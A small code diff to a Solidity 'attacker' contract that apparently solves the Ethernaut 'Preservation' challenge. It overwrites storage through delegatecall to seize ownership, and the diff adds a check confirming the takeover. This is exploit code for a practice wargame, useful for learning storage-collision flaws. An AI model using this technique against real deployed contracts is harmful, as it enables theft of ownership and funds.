@@ -9,6 +9,7 @@ contract attacker {
   function attack(Preservation _preservation) public {
     _preservation.setFirstTime(uint256(uint160(address(this))));
     _preservation.setFirstTime(uint256(uint160(hackerAddress)));
+    require(_preservation.owner() == hackerAddress);
   }
 
   // 2nd call a function with the same name but storing the address you want to set as Owner. It will modify the third storage in the contract.
